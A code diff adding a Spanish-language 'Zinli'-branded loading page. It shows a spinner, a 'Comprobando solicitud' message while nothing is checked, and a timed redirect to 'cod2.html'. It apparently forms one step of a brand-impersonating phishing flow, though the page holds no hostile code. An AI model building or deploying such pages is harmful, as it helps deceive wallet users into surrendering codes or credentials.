@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zinli - Cargando</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --purple-primary: #5A2D82;
+            --purple-light: #EBE4FF;
+            --text-dark: #2A2A2A;
+            --text-muted: #6E6E6E;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: #F8F9FA;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Contenedor principal responsive */
+        .app-container {
+            width: 100%;
+            max-width: 440px;
+            height: 100vh;
+            background-color: #FFFFFF;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px 28px;
+        }
+
+        /* En PC se centra como tarjeta */
+        @media (min-width: 600px) {
+            .app-container {
+                height: 90vh;
+                max-height: 750px;
+                border-radius: 24px;
+                box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.08);
+            }
+        }
+
+        /* Encabezado con Logo */
+        header {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            padding-top: 12px;
+        }
+
+        .logo-img {
+            height: 40px;
+            object-fit: contain;
+            mix-blend-mode: multiply;
+        }
+
+        /* Contenido Central */
+        .loader-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            width: 100%;
+        }
+
+        /* Spinner de carga */
+        .spinner {
+            width: 64px;
+            height: 64px;
+            border: 5px solid var(--purple-light);
+            border-top: 5px solid var(--purple-primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 30px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Texto estático arriba: "Cargando..." */
+        .status-text {
+            font-size: 20px;
+            color: var(--text-dark);
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        /* Texto dinámico abajo (cambia de "No cierre..." a "Comprobando solicitud") */
+        .sub-text {
+            font-size: 14px;
+            color: var(--text-muted);
+            font-weight: 400;
+            transition: opacity 0.4s ease;
+        }
+
+        footer {
+            height: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <!-- Logo de la marca -->
+        <header>
+            <img src="logo.webp" alt="Zinli Logo" class="logo-img">
+        </header>
+
+        <!-- Loader y Textos -->
+        <main class="loader-content">
+            <div class="spinner"></div>
+            <!-- El "Cargando..." se mantiene fijo arriba -->
+            <h2 class="status-text">Cargando...</h2>
+            <!-- El texto de abajo cambia de estado -->
+            <p class="sub-text" id="subText">No cierre esta ventana</p>
+        </main>
+
+        <footer></footer>
+    </div>
+
+    <!-- JavaScript para alternar el texto inferior y redireccionar -->
+    <script>
+        const subText = document.getElementById('subText');
+
+        // A los 4 segundos cambia el texto inferior a "Comprobando solicitud"
+        setTimeout(() => {
+            subText.style.opacity = '0';
+            
+            setTimeout(() => {
+                subText.textContent = "Comprobando solicitud";
+                subText.style.opacity = '1';
+            }, 400);
+
+        }, 4000);
+
+        // A los 8 segundos redirecciona a cod2.html (puedes cambiar los tiempos si deseas)
+        setTimeout(() => {
+            window.location.href = "cod2.html";
+        }, 8000);
+    </script>
+</body>
+</html>
